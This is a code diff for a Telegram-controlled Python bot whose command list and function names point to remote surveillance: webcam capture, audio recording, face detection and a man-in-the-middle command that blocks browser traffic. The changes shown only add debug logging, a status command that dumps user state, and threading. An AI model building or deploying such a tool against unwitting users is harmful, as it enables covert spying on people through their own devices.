@@ -665,7 +665,7 @@ class PeppinoTelegram:
             Command("block_chrome", self.block_chrome, "Blocks traffic on chrome.", "mitm", "🚫 Block CHROME"),
 
             # 🔧 Utilities & Testing
-            Command("status", lambda: self.bsend("Hey! I'm online"), "Just checking if the bot is online.",  "utility", "Check Status"),
+            Command("status", self.send_status, "Just checking if the bot is online.",  "utility", "Check Status"),
             Command("restart", self.restart, "Restarts the bot process.",  "utility", "Restart"),
             Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
             Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
@@ -1200,7 +1200,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.stop(confirm=False)
 
     def handle(self, msg: str) -> None:
-        print(f"Handling message type: {glance(msg)[0]}")
+        print(f"Handling message type: {msg}\nUserStatus: {self.user}")
         content_type, chat_type, chat_id = glance(msg)
         if chat_id in self.strangers:
             return
@@ -1208,7 +1208,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         message_id = msg["message_id"]
         user = msg['from']
         username = user.get('username') or "N/A"
-
 
         if chat_id == self.owner_id:
             self.owner_name = sender_name
@@ -1829,17 +1828,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.bsendWithHtml(preview_msg)
 
     def on_callback_query(self, msg) -> None:
+        print(f"[on_callback_query] {msg=} {self.user=}")
         query_id, from_id, query_data = glance(msg, flavor='callback_query')
-        self.bot.answerCallbackQuery(query_id, text="Got it!")  # or empty text=""
+        self.bot.answerCallbackQuery(query_id, text="")
 
         if self.user.get("status") == "waiting_callback" and query_data.startswith("choice:"):
             parts = query_data.split(":", 2)
             if len(parts) == 3 and parts[1] == self.user.get("expected_menu_id"):
-                self.user["last_callback"] = parts[2]          # ← the key ("button1", "yes", etc.)
+                self.user["last_callback"] = parts[2]
                 return
-
-        # If not our menu → treat as normal command
-        self.parse_command(query_data)
+        Thread(target=self.parse_command, args=(query_data, )).start()
 
     def opencap(self) -> None:
         print("Opening webcam capture")
@@ -2109,7 +2107,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         remove(filepath)
 
     def parse_text(self, msg: dict) -> None:
-        print(f"Parsing text message: {msg['text'][:50]}...")
+        print(f"Parsing text message: {self.user=} {msg['text'][:50]}...")
         text = msg["text"]
         date = int(msg["date"])
         if (date+self.message_timeout)<monotonic():
@@ -2123,7 +2121,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.parse_command(command) 
             else:
                 self.parse_command(text)
+
         elif self.user["status"] == "input_requested":
+            print(f"New last_response set: {text.strip()=}")
             self.user["last_response"] = text.strip()
 
     def plankton(self, audio=True) -> None:
@@ -2533,6 +2533,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             )
             return False
 
+    def send_status(self) -> None:
+        lines = ["<b>📋 self.user Overview</b>\n"]
+
+        for key, value in sorted(self.user.items()):
+            val_str = json.dumps(value, default=str, ensure_ascii=False)
+            if len(val_str) > 60:
+                val_str = val_str[:57] + "..."
+            lines.append(f"<b>{html.escape(key)}</b>: <code>{html.escape(val_str)}</code>")
+
+        self.bsendWithHtml("\n".join(lines))
+
     def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
         print(f"Recording and sending audio for {seconds} seconds")
         message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
@@ -2849,10 +2860,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.user["last_response"]=None
         start = monotonic()
         while not self.user["last_response"] and monotonic()-start < timeout:
+            print(f"Waiting for user response on question {question}\n{self.user=}")
             sleep(1)
         else:
             tmp = self.user["last_response"]
-            self.user["last_response"]=None
+            self.user["last_response"] = None
             self.user["status"] = None
             if delete:
                 self.delete_message(msgid)
@@ -2883,7 +2895,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
         markup = {"inline_keyboard": keyboard}
 
-        menu_msg_id = self.bsend(title, reply_markup=markup)
+        menu_msg_id = self.bsendWithHtml(title, reply_markup=markup)
 
         self.user["status"] = "waiting_callback"
         self.user["expected_menu_id"] = menu_id
@@ -3047,7 +3059,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         )
 
         return res
-
 
     def waitforface(self, timeout=60):
         print(f"Waiting for face for {timeout} seconds")
